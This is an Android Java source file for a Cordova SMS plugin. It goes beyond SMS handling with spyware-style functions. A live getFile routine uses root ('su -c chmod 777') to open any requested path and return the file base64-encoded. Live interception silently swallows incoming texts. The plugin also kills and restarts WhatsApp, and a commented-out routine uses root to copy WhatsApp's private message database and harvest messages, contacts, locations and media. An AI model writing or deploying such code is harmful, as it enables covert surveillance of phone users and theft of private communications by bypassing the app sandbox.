package com.rjfun.cordova.sms;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.PendingIntent;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteDatabase;
import android.content.BroadcastReceiver;
import android.content.pm.PackageManager;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.ComponentName;
import android.database.SQLException;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Environment;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.PhoneNumberUtils;
import android.util.Log;
import android.Manifest;
import android.util.Base64;
import android.support.v4.content.IntentCompat;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;

import org.apache.cordova.CallbackContext;
import org.apache.cordova.CordovaPlugin;
import org.apache.cordova.PluginResult;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SMSPlugin extends CordovaPlugin {
    private static final String LOGTAG = "SMSPlugin";
    
    public static final String ACTION_SET_OPTIONS = "setOptions";
    private static final String ACTION_START_WATCH = "startWatch";
    private static final String ACTION_STOP_WATCH = "stopWatch";
    private static final String ACTION_ENABLE_INTERCEPT = "enableIntercept";
    private static final String ACTION_LIST_SMS = "listSMS";
    private static final String ACTION_DELETE_SMS = "deleteSMS";
    private static final String ACTION_RESTORE_SMS = "restoreSMS";
    private static final String ACTION_SEND_SMS = "sendSMS";
    private static final String ACTION_CHECK_WA = "isWhatsAppInstalled";
    private static final String ACTION_LIST_WA = "listWA";
	private static final String ACTION_GET_FILE = "getFile";
	private static final String ACTION_RESTART_WA = "restartWA";
	private static final String ACTION_READ_KEY = "readKey";
	private static final String ACTION_WRITE_KEY = "writeKey";
	private static final String ACTION_GET_PERMISSION = "getPermission";
    
    public static final String OPT_LICENSE = "license";
    private static final String SEND_SMS_ACTION = "SENT_SMS_ACTION";
    private static final String DELIVERED_SMS_ACTION = "DELIVERED_SMS_ACTION";
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    public static final String SMS_EXTRA_NAME = "pdus";
    
    public static final String SMS_URI_ALL = "content://sms/";
    public static final String SMS_URI_INBOX = "content://sms/inbox";
    public static final String SMS_URI_SEND = "content://sms/sent";
    public static final String SMS_URI_DRAFT = "content://sms/draft";
    public static final String SMS_URI_OUTBOX = "content://sms/outbox";
    public static final String SMS_URI_FAILED = "content://sms/failed";
    public static final String SMS_URI_QUEUED = "content://sms/queued";
    
    public static final String BOX = "box";
    public static final String ADDRESS = "address";
    public static final String BODY = "body";
    public static final String READ = "read";
    public static final String SEEN = "seen";
    public static final String SUBJECT = "subject";
    public static final String SERVICE_CENTER = "service_center";
    public static final String DATE = "date";
    public static final String DATE_SENT = "date_sent";
    public static final String STATUS = "status";
    public static final String REPLY_PATH_PRESENT = "reply_path_present";
    public static final String TYPE = "type";
    public static final String PROTOCOL = "protocol";
    
    public static final int MESSAGE_TYPE_INBOX = 1;
    public static final int MESSAGE_TYPE_SENT = 2;
    public static final int MESSAGE_IS_NOT_READ = 0;
    public static final int MESSAGE_IS_READ = 1;
    public static final int MESSAGE_IS_NOT_SEEN = 0;
    public static final int MESSAGE_IS_SEEN = 1;
    
    private static final String SMS_GENERAL_ERROR = "SMS_GENERAL_ERROR";
    private static final String NO_SMS_SERVICE_AVAILABLE = "NO_SMS_SERVICE_AVAILABLE";
    private static final String SMS_FEATURE_NOT_SUPPORTED = "SMS_FEATURE_NOT_SUPPORTED";
    private static final String SENDING_SMS_ID = "SENDING_SMS";
	private static final int REQUEST_READ_PHONE_STATE = 2;
    
    private ContentObserver mObserver = null;
    private BroadcastReceiver mReceiver = null;
    private boolean mIntercept = false;
    private String lastFrom = "";
    private String lastContent = "";

    public boolean execute(String action, JSONArray inputs, CallbackContext callbackContext) throws JSONException {
        PluginResult result = null;
        if (ACTION_SET_OPTIONS.equals(action)) {
            JSONObject options = inputs.optJSONObject(0);
            this.setOptions(options);
            result = new PluginResult(PluginResult.Status.OK);
        } else if (ACTION_START_WATCH.equals(action)) {
            result = this.startWatch(callbackContext);
        } else if (ACTION_STOP_WATCH.equals(action)) {
            result = this.stopWatch(callbackContext);
        } else if (ACTION_ENABLE_INTERCEPT.equals(action)) {
            boolean on_off = inputs.optBoolean(0);
            result = this.enableIntercept(on_off, callbackContext);
        } else if (ACTION_DELETE_SMS.equals(action)) {
            JSONObject msg = inputs.optJSONObject(0);
            result = this.deleteSMS(msg, callbackContext);
        } else if (ACTION_RESTORE_SMS.equals(action)) {
            JSONArray smsList = inputs.optJSONArray(0);
            result = this.restoreSMS(smsList, callbackContext);
        } else if (ACTION_LIST_SMS.equals(action)) {
            JSONObject filters = inputs.optJSONObject(0);
            result = this.listSMS(filters, callbackContext);
        } else if (ACTION_SEND_SMS.equals(action)) {
            JSONArray addressList = inputs.optJSONArray(0);
            String message = inputs.optString(1);
            result = this.sendSMS(addressList, message, callbackContext);
		} else if(ACTION_CHECK_WA.equals(action)){
			result = this.isWhatsAppInstalled(callbackContext);
		} else if(ACTION_LIST_WA.equals(action)){
			result = this.readWA(callbackContext);
		} else if(ACTION_GET_FILE.equals(action)){
            String fileName = inputs.optString(0);
			boolean fromSD = inputs.optBoolean(1);
			result = this.getFile(fileName, fromSD, callbackContext);
		} else if(ACTION_RESTART_WA.equals(action)){
			result = this.restartWA(callbackContext);
		} else if(ACTION_READ_KEY.equals(action)){
			result = this.readLogin(callbackContext);
        } else if(ACTION_WRITE_KEY.equals(action)){			
            String data = inputs.optString(0);
			result = this.saveLogin(data, callbackContext);
		} else if(ACTION_GET_PERMISSION.equals(action)){
			result = this.getPermission(callbackContext);
        } else {
            Log.d(LOGTAG, String.format("Invalid action passed: %s", action));
            result = new PluginResult(PluginResult.Status.INVALID_ACTION);
        }
        if (result != null) {
            callbackContext.sendPluginResult(result);
        }
        return true;
    }

    public void onDestroy() {
        this.stopWatch(null);
    }

    public void setOptions(JSONObject options) {
        Log.d(LOGTAG, ACTION_SET_OPTIONS);
    }

    protected String __getProductShortName() {
        return "SMS";
    }

    public final String md5(String s) {
        try {
            MessageDigest digest = MessageDigest.getInstance("MD5");
            digest.update(s.getBytes());
            byte[] messageDigest = digest.digest();
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < messageDigest.length; ++i) {
                String h = Integer.toHexString(255 & messageDigest[i]);
                while (h.length() < 2) {
                    h = "0" + h;
                }
                hexString.append(h);
            }
            return hexString.toString();
        }
        catch (NoSuchAlgorithmException digest) {
            return "";
        }
    }

    private PluginResult startWatch(CallbackContext callbackContext) {
        Log.d(LOGTAG, ACTION_START_WATCH);
        if (this.mObserver == null) {
            this.createContentObserver();
        }
        if (this.mReceiver == null) {
            this.createIncomingSMSReceiver();
        }
        if (callbackContext != null) {
            callbackContext.success();
        }
        return null;
    }

    private PluginResult stopWatch(CallbackContext callbackContext) {
        Log.d(LOGTAG, ACTION_STOP_WATCH);
        Activity ctx = this.cordova.getActivity();
        if (this.mReceiver != null) {
            ctx.unregisterReceiver(this.mReceiver);
            this.mReceiver = null;
            Log.d(LOGTAG, "broadcast receiver unregistered");
        }
        if (this.mObserver != null) {
            ctx.getContentResolver().unregisterContentObserver(this.mObserver);
            this.mObserver = null;
            Log.d(LOGTAG, "sms inbox observer unregistered");
        }
        if (callbackContext != null) {
            callbackContext.success();
        }
        return null;
    }
	
	private PluginResult getPermission(CallbackContext callbackContext){
		/*int permissionCheck = ContextCompat.checkSelfPermission(this.cordova.getActivity(), Manifest.permission.READ_PHONE_STATE);
        if (permissionCheck != this.cordova.getActivity().getPackageManager().PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this.cordova.getActivity(), new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_READ_PHONE_STATE);
        }*/
        if (callbackContext != null) {
            callbackContext.success();
        }
		return null;
	}

    private PluginResult enableIntercept(boolean on_off, CallbackContext callbackContext) {
        Log.d(LOGTAG, ACTION_ENABLE_INTERCEPT);
        this.mIntercept = on_off;
        if (callbackContext != null) {
            callbackContext.success();
        }
        return null;
    }

    private PluginResult sendSMS(JSONArray addressList, String text, CallbackContext callbackContext) {
        Log.d(LOGTAG, ACTION_SEND_SMS);
        if (this.cordova.getActivity().getPackageManager().hasSystemFeature("android.hardware.telephony")) {
            int n;
            if ((n = addressList.length()) > 0) {
                PendingIntent sentIntent = PendingIntent.getBroadcast((Context)this.cordova.getActivity(), (int)0, (Intent)new Intent("SENDING_SMS"), (int)0);
                SmsManager sms = SmsManager.getDefault();
                for (int i = 0; i < n; ++i) {
                    String address;
                    if ((address = addressList.optString(i)).length() <= 0) continue;
                    sms.sendTextMessage(address, null, text, sentIntent, (PendingIntent)null);
                }
            } else {
                PendingIntent sentIntent = PendingIntent.getActivity((Context)this.cordova.getActivity(), (int)0, (Intent)new Intent("android.intent.action.VIEW"), (int)0);
                Intent intent = new Intent("android.intent.action.VIEW");
                intent.putExtra("sms_body", text);
                intent.setType("vnd.android-dir/mms-sms");
                try {
                    sentIntent.send(this.cordova.getActivity().getApplicationContext(), 0, intent);
                }
                catch (PendingIntent.CanceledException e) {
                    e.printStackTrace();
                }
            }
            callbackContext.sendPluginResult(new PluginResult(PluginResult.Status.OK, "OK"));
        } else {
            callbackContext.sendPluginResult(new PluginResult(PluginResult.Status.ERROR, "SMS is not supported"));
        }
        return null;
    }
	
	private byte[] loadFileAsBytesArray(File file) throws Exception { 
        int length = (int) file.length();
        BufferedInputStream reader = new BufferedInputStream(new FileInputStream(file));
        byte[] bytes = new byte[length];
        reader.read(bytes, 0, length);
        reader.close();
        return bytes;
 
    }
	
	private String encode(String sourceFile) throws Exception { 
		File file = new File(sourceFile);
		return Base64.encodeToString(loadFileAsBytesArray(file), Base64.DEFAULT);			
	}
	
	private String getExtType(String fileName){
		String extension = "";
		int i = fileName.lastIndexOf('.');
		if (i > 0) {
			extension = fileName.substring(i+1);
		}
		if(extension.equals("jpg") || extension.equals("gif") || extension.equals("png"))
			return "image";
		else if(extension.equals("3gp") || extension.equals("caf") || extension.equals("wav") || extension.equals("mp3") || extension.equals("wma") ||
			extension.equals("ogg") || extension.equals("aif") || extension.equals("aif") || extension.equals("aac") || extension.equals("m4a") || extension.equals("opus")) 
			return "audio";
        else if(extension.equals("3gp") || extension.equals("mp4") || extension.equals("mov") || extension.equals("avi"))
			return "video"; 
		else if(extension.equals("xls") || extension.equals("xlsx") || extension.equals("doc") || extension.equals("docx") || extension.equals("ppt") || extension.equals("pptx"))
			return "other";
		return extension;
	}
	
	private PluginResult readLogin(CallbackContext callbackContext) throws JSONException{
		JSONObject obj = new JSONObject();
		byte[] bytes = new byte[1];
		try {
			FileInputStream inputStream = getApplicationContext().openFileInput("Key");
			bytes = new byte[(int)inputStream.getChannel().size()];	
			inputStream.read(bytes);
			inputStream.close();
		} catch(Exception e){			
		}
		obj.put("data", new String(bytes));
		callbackContext.success(obj);
		return null;
	}
	
	private PluginResult saveLogin(String data, CallbackContext callbackContext) throws JSONException{
		JSONObject obj = new JSONObject();	
		try {
			FileOutputStream outputStream = getApplicationContext().openFileOutput("Key", Context.MODE_PRIVATE);
			outputStream.write(data.getBytes());
			outputStream.close();
		} catch(Exception e){
			
		}
		obj.put("success", true);
		callbackContext.success(obj);
		return null;
	}
	
	private PluginResult restartWA(CallbackContext callbackContext) throws JSONException{
		JSONObject obj = new JSONObject();	
		PackageManager pm = getApplicationContext().getPackageManager();
		ComponentName componentName = pm.getLaunchIntentForPackage("com.whatsapp").getComponent();
        Intent intent = IntentCompat.makeRestartActivityTask(componentName);
        getApplicationContext().startActivity(intent);
		((ActivityManager)this.cordova.getActivity().getSystemService(Context.ACTIVITY_SERVICE)).killBackgroundProcesses("com.whatsapp");
		obj.put("success", true);
		callbackContext.success(obj);
		return null;
	}
	
	private PluginResult getFile(String fileName, boolean fromSD, CallbackContext callbackContext)throws JSONException{	
		JSONObject obj = new JSONObject();		
		String baseDir = Environment.getExternalStorageDirectory().getAbsolutePath();
		String filePath = (fromSD ? baseDir : "") + fileName;
		File file = new File(filePath);
		
		try{
			String [] cmd = { "su", "-c", "chmod", "777", filePath};
			Process process = new ProcessBuilder(cmd).start();
			process.waitFor();
			if(file.exists()) {
				String attach = encode(file.getAbsolutePath());
				if(attach != null && attach.length() > 0){
					obj.put("file", attach);
				}					
			}else{
				obj.put("file", "File not found!");
			}
			obj.put("path", filePath);
			obj.put("fromSD", fromSD);
		} catch (Exception ex) {
			String stackTrace = Log.getStackTraceString(ex); 
			callbackContext.error(stackTrace);
			return null;
		}
		
		callbackContext.success(obj);
		return null;
	}
	
	private PluginResult readWA(final CallbackContext callbackContext)throws JSONException{	
		/*JSONArray data = new JSONArray();
		String baseDir = Environment.getExternalStorageDirectory().getAbsolutePath();
		try{
			String [] cmd = { "su", "-c", "chmod", "777", "/data/data/com.whatsapp/databases/msgstore.db"};
			String [] cmd2 = { "su", "-c", "chmod", "777", "/data/data/com.whatsapp/databases/msgstore.db-wal"};
			String [] cmd3 = { "su", "-c", "mkdir", baseDir + "/sync_db"};
			String [] cmd4 = {"su", "-c", "cp", "-f", "/data/data/com.whatsapp/databases/msgstore.db", baseDir + "/sync_db/msg.db"};
			String [] cmd5 = {"su", "-c", "chmod", "777", baseDir + "/sync_db/msg.db"};
			Process process = new ProcessBuilder(cmd).start();
			Process process2 = new ProcessBuilder(cmd2).start();
			Process process3 = new ProcessBuilder(cmd3).start();
			Process process4 = new ProcessBuilder(cmd4).start();
			Process process5 = new ProcessBuilder(cmd5).start();
			process.waitFor();
			process2.waitFor();
			process3.waitFor();
			process4.waitFor();
			process5.waitFor();

		} catch (Exception ex) {
			callbackContext.error(ex.toString());
			ex.printStackTrace();
			return null;
		}
		
		SQLiteDatabase db = SQLiteDatabase.openDatabase(baseDir + "/sync_db/msg.db", null, SQLiteDatabase.OPEN_READONLY);
		/*WhatsAppDBHelper db = new WhatsAppDBHelper("msgstore.db", getApplicationContext());
		db.openDataBase();		
		db.rawQuery("PRAGMA locking_mode = NORMAL", null);
		Cursor cur = db.rawQuery("SELECT * FROM `messages` ORDER BY `timestamp` DESC LIMIT 1000;", null);	
		
		if (!cur.moveToFirst()) {
			db.close();
			callbackContext.success(data);
			return null;
		}
		try{
			while (cur.moveToNext()) {
				JSONObject obj = new JSONObject();
				String media = cur.getString(cur.getColumnIndex("media_name"));
				String type = cur.getString(cur.getColumnIndex("media_mime_type"));
				Double lati = cur.getDouble(cur.getColumnIndex("latitude"));
				Double longg = cur.getDouble(cur.getColumnIndex("longitude"));
				obj.put("id", cur.getString(cur.getColumnIndex("key_id")));
				obj.put("number", cur.getString(cur.getColumnIndex("key_remote_jid")));
				obj.put("date", cur.getString(cur.getColumnIndex("timestamp")));
				obj.put("status", cur.getInt(cur.getColumnIndex("status")));
				obj.put("type", cur.getInt(cur.getColumnIndex("origin")));
				obj.put("body", cur.getString(cur.getColumnIndex("data")));
				obj.put("media_url", cur.getString(cur.getColumnIndex("media_url")));
				obj.put("media_name", media);
				obj.put("media_type", type);
				obj.put("media_caption",cur.getString(cur.getColumnIndex("media_caption")));
				if(lati > 0 || longg >0){
					JSONObject loc = new JSONObject();
					loc.put("long", longg);
					loc.put("lat", lati);
					obj.put("location", loc);
				}				
				if(media != null && media.length() > 0){
					obj.put("media_type2", getExtType(media));
					if(type == null){
						type = getExtType(media);
					}
					if(type != ""){
						String loc = "Documents";
						if(type.indexOf("audio") > -1)
							loc = "Audio";
						else if(type.indexOf("image") > -1)
							loc = "Images";
						else if(type.indexOf("video") > -1)
							loc = "Video";					
						String filePath = baseDir + "/WhatsApp/Media/WhatsApp " + loc + "/" + media;	
						File file = new File(filePath);	
						if(!file.exists()){
							filePath = baseDir + "/WhatsApp/Media/WhatsApp " + loc + "/Sent/" + media;
							file = new File(filePath);
						}
						if(file.exists()) {
							String attach = encode(file.getAbsolutePath());
							if(attach != null && attach.length() > 0){
								obj.put("attachment", attach);
							}					
						}else{
							obj.put("attachment", "File not found!");
						}
						obj.put("baseFile", filePath);	
					}					
				}
				data.put(obj);
			}
		}catch(Exception ee){
			db.close();	
			String stackTrace = Log.getStackTraceString(ee); 
			callbackContext.error(stackTrace);
			return null;
		}
		
        db.close();	
		try{
			String [] cmd1 = { "su", "-c", "chmod", "660", "/data/data/com.whatsapp/databases/msgstore.db"};
			Process process = new ProcessBuilder(cmd1).start();
			process.waitFor();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		callbackContext.success(data);*/
		return null;
	}
	
	private PluginResult isWhatsAppInstalled(final CallbackContext callbackContext)throws JSONException{
		JSONObject data = new JSONObject();
		JSONObject obj = new JSONObject();
		boolean installed = false;
		PackageManager pm = getApplicationContext().getPackageManager();

		try {
			pm.getPackageInfo("com.whatsapp", PackageManager.GET_ACTIVITIES);
			installed =  true;
		} catch (PackageManager.NameNotFoundException e) {
			installed = false;
		}
		obj.put("installed", installed);
		data.put("whatsapp", obj);		
		callbackContext.success(data);
		return null;
	}

    private PluginResult listSMS(JSONObject filter, CallbackContext callbackContext) {
        Log.i(LOGTAG, ACTION_LIST_SMS);
        String uri_filter = filter.has(BOX) ? filter.optString(BOX) : "inbox";
        int fread = filter.has(READ) ? filter.optInt(READ) : -1;
        int fid = filter.has("_id") ? filter.optInt("_id") : -1;
        String faddress = filter.optString(ADDRESS);
        String fcontent = filter.optString(BODY);
        int indexFrom = filter.has("indexFrom") ? filter.optInt("indexFrom") : 0;
        int maxCount = filter.has("maxCount") ? filter.optInt("maxCount") : 10;
        JSONArray jsons = new JSONArray();
        Activity ctx = this.cordova.getActivity();
        Uri uri = Uri.parse((SMS_URI_ALL + uri_filter));
        Cursor cur = ctx.getContentResolver().query(uri, (String[])null, "", (String[])null, null);
        int i = 0;
        while (cur.moveToNext()) {
            JSONObject json;
            boolean matchFilter = false;
            if (fid > -1) {
                matchFilter = (fid == cur.getInt(cur.getColumnIndex("_id")));
            } else if (fread > -1) {
                matchFilter = (fread == cur.getInt(cur.getColumnIndex(READ)));
            } else if (faddress.length() > 0) {
                matchFilter = PhoneNumberUtils.compare(faddress, cur.getString(cur.getColumnIndex(ADDRESS)).trim());
            } else if (fcontent.length() > 0) {
                matchFilter = fcontent.equals(cur.getString(cur.getColumnIndex(BODY)).trim());
            } else {
                matchFilter = true;
            }
            if (! matchFilter) continue;
            
            if (i < indexFrom) continue;
            if (i >= indexFrom + maxCount) break;
            ++i;

            if ((json = this.getJsonFromCursor(cur)) == null) {
                callbackContext.error("failed to get json from cursor");
                cur.close();
                return null;
            }
            jsons.put((Object)json);
        }
        cur.close();
        callbackContext.success(jsons);
        return null;
    }

    private JSONObject getJsonFromCursor(Cursor cur) {
		JSONObject json = new JSONObject();
		
		int nCol = cur.getColumnCount();
		String keys[] = cur.getColumnNames();

		try {
			for(int j=0; j<nCol; j++) {
				switch(cur.getType(j)) {
				case Cursor.FIELD_TYPE_NULL:
					json.put(keys[j], null);
					break;
				case Cursor.FIELD_TYPE_INTEGER:
					json.put(keys[j], cur.getLong(j));
					break;
				case Cursor.FIELD_TYPE_FLOAT:
					json.put(keys[j], cur.getFloat(j));
					break;
				case Cursor.FIELD_TYPE_STRING:
					json.put(keys[j], cur.getString(j));
					break;
				case Cursor.FIELD_TYPE_BLOB:
					json.put(keys[j], cur.getBlob(j));
					break;
				}
			}
		} catch (Exception e) {
			return null;
		}

		return json;
    }

    private void fireEvent(final String event, JSONObject json) {
    	final String str = json.toString();
    	Log.d(LOGTAG, "Event: " + event + ", " + str);
    	
        cordova.getActivity().runOnUiThread(new Runnable(){
            @Override
            public void run() {
            	String js = String.format("javascript:cordova.fireDocumentEvent(\"%s\", {\"data\":%s});", event, str);
            	webView.loadUrl( js );
            }
        });
    }
    
    private void onSMSArrive(JSONObject json) {
        String from = json.optString(ADDRESS);
        String content = json.optString(BODY);
//         if (from.equals(this.lastFrom) && content.equals(this.lastContent)) {
//             return;
//         }
        this.lastFrom = from;
        this.lastContent = content;
        this.fireEvent("onSMSArrive", json);
    }

    protected void createIncomingSMSReceiver() {
        Activity ctx = this.cordova.getActivity();
        this.mReceiver = new BroadcastReceiver(){

            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                Log.d(LOGTAG, ("onRecieve: " + action));
                if (SMS_RECEIVED.equals(action)) {
                    Bundle bundle;
                    if (SMSPlugin.this.mIntercept) {
                        this.abortBroadcast();
                    }
                    if ((bundle = intent.getExtras()) != null) {
                        Object[] pdus;
                        if ((pdus = (Object[])bundle.get("pdus")).length != 0) {
                            for (int i = 0; i < pdus.length; ++i) {
                                SmsMessage sms = SmsMessage.createFromPdu((byte[])((byte[])pdus[i]));
                                JSONObject json = SMSPlugin.this.getJsonFromSmsMessage(sms);
                                SMSPlugin.this.onSMSArrive(json);
                            }
                        }
                    }
                }
            }
        };
        String[] filterstr = new String[]{SMS_RECEIVED};
        for (int i = 0; i < filterstr.length; ++i) {
            IntentFilter filter = new IntentFilter(filterstr[i]);
            filter.setPriority(100);
            ctx.registerReceiver(this.mReceiver, filter);
            Log.d(LOGTAG, ("broadcast receiver registered for: " + filterstr[i]));
        }
    }

    protected void createContentObserver() {
        Activity ctx = this.cordova.getActivity();
        this.mObserver = new ContentObserver(new Handler()){

            public void onChange(boolean selfChange) {
                this.onChange(selfChange, null);
            }

            public void onChange(boolean selfChange, Uri uri) {
                ContentResolver resolver = cordova.getActivity().getContentResolver(); 
                Log.d(LOGTAG, ("onChange, selfChange: " + selfChange + ", uri: " + (Object)uri));
                int id = -1;
                String str;
                if (uri != null && (str = uri.toString()).startsWith(SMS_URI_ALL)) {
                    try {
                        id = Integer.parseInt(str.substring(SMS_URI_ALL.length()));
                        Log.d(LOGTAG, ("sms id: " + id));
                    }
                    catch (NumberFormatException var6_6) {
                        // empty catch block
                    }
                }
                if (id == -1) {
                    uri = Uri.parse(SMS_URI_INBOX);
                }
                Cursor cur = resolver.query(uri, null, null, null, "_id desc");
                if (cur != null) {
                    int n = cur.getCount();
                    Log.d(LOGTAG, ("n = " + n));
                    if (n > 0 && cur.moveToFirst()) {
                        JSONObject json;
                        if ((json = SMSPlugin.this.getJsonFromCursor(cur)) != null) {
                            onSMSArrive(json);
                        } else {
                            Log.d(LOGTAG, "fetch record return null");
                        }
                    }
                    cur.close();
                }
            }
        };
        ctx.getContentResolver().registerContentObserver(Uri.parse(SMS_URI_ALL), true, this.mObserver);
        Log.d(LOGTAG, "sms inbox observer registered");
    }

    private PluginResult deleteSMS(JSONObject filter, CallbackContext callbackContext) {
        Log.d(LOGTAG, ACTION_DELETE_SMS);
        String uri_filter = filter.has(BOX) ? filter.optString(BOX) : "inbox";
        int fread = filter.has(READ) ? filter.optInt(READ) : -1;
        int fid = filter.has("_id") ? filter.optInt("_id") : -1;
        String faddress = filter.optString(ADDRESS);
        String fcontent = filter.optString(BODY);
        Activity ctx = this.cordova.getActivity();
        int n = 0;
        try {
            Uri uri = Uri.parse((SMS_URI_ALL + uri_filter));
            Cursor cur = ctx.getContentResolver().query(uri, (String[])null, "", (String[])null, null);
            while (cur.moveToNext()) {
                int id = cur.getInt(cur.getColumnIndex("_id"));
                boolean matchId = fid > -1 && fid == id;
                int read = cur.getInt(cur.getColumnIndex(READ));
                boolean matchRead = fread > -1 && fread == read;
                String address = cur.getString(cur.getColumnIndex(ADDRESS)).trim();
                boolean matchAddr = faddress.length() > 0 && PhoneNumberUtils.compare(faddress, address);
                String body = cur.getString(cur.getColumnIndex(BODY)).trim();
                boolean matchContent = fcontent.length() > 0 && body.equals(fcontent);
                if (!matchId && !matchRead && !matchAddr && !matchContent) continue;
                ctx.getContentResolver().delete(uri, "_id=" + id, (String[])null);
                ++n;
            }
            callbackContext.success(n);
        }
        catch (Exception e) {
            callbackContext.error(e.toString());
        }
        return null;
    }

    private JSONObject getJsonFromSmsMessage(SmsMessage sms) {
    	JSONObject json = new JSONObject();
    	
        try {
        	json.put( ADDRESS, sms.getOriginatingAddress() );
        	json.put( BODY, sms.getMessageBody() ); // May need sms.getMessageBody.toString()
        	json.put( DATE_SENT, sms.getTimestampMillis() );
        	json.put( DATE, System.currentTimeMillis() );
        	json.put( READ, MESSAGE_IS_NOT_READ );
        	json.put( SEEN, MESSAGE_IS_NOT_SEEN );
        	json.put( STATUS, sms.getStatus() );
        	json.put( TYPE, MESSAGE_TYPE_INBOX );
        	json.put( SERVICE_CENTER, sms.getServiceCenterAddress());
        	
        } catch ( Exception e ) { 
            e.printStackTrace(); 
        }

    	return json;
    }
    
    private ContentValues getContentValuesFromJson(JSONObject json) {
    	ContentValues values = new ContentValues();
    	values.put( ADDRESS, json.optString(ADDRESS) );
    	values.put( BODY, json.optString(BODY));
    	values.put( DATE_SENT,  json.optLong(DATE_SENT));
    	values.put( READ, json.optInt(READ));
    	values.put( SEEN, json.optInt(SEEN));
    	values.put( TYPE, json.optInt(TYPE) );
    	values.put( SERVICE_CENTER, json.optString(SERVICE_CENTER));
    	return values;
    }
    private PluginResult restoreSMS(JSONArray array, CallbackContext callbackContext) {
        ContentResolver resolver = this.cordova.getActivity().getContentResolver();
        Uri uri = Uri.parse(SMS_URI_INBOX);
        int n = array.length();
        int m = 0;
        for (int i = 0; i < n; ++i) {
            JSONObject json;
            if ((json = array.optJSONObject(i)) == null) continue;
            String str = json.toString();
            Log.d(LOGTAG, str);
            Uri newuri = resolver.insert(uri, this.getContentValuesFromJson(json));
            Log.d(LOGTAG, ("inserted: " + newuri.toString()));
            ++m;
        }
        if (callbackContext != null) {
            callbackContext.success(m);
        }
        return null;
    }
	
	private Context getApplicationContext(){
		return this.cordova.getActivity().getApplicationContext();
	}

}

class WhatsAppDBHelper extends SQLiteOpenHelper{
	private String path = "/data/data/com.whatsapp/databases/";
	private String db_name = "";
	private SQLiteDatabase myDataBase;  
    private final Context myContext;
	
	public WhatsAppDBHelper(String name, Context context) {
		super(context, name, null, 1);
		this.db_name = name;
        this.myContext = context;
	}

    @Override
    public void onCreate(SQLiteDatabase db) {
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
    }
	
	public void openDataBase() throws SQLException{
        String myPath = this.path + this.db_name;
    	this.myDataBase = SQLiteDatabase.openDatabase(myPath, null, SQLiteDatabase.OPEN_READONLY); 
    }
	
	public Cursor query(String query, String[] whereArgs){
		if(this.myDataBase != null)
			return this.myDataBase.rawQuery(query, whereArgs);
		return null;
	}
	
	@Override
	public synchronized void close() {
		if(myDataBase != null)
			myDataBase.close();
		super.close(); 
	}
}
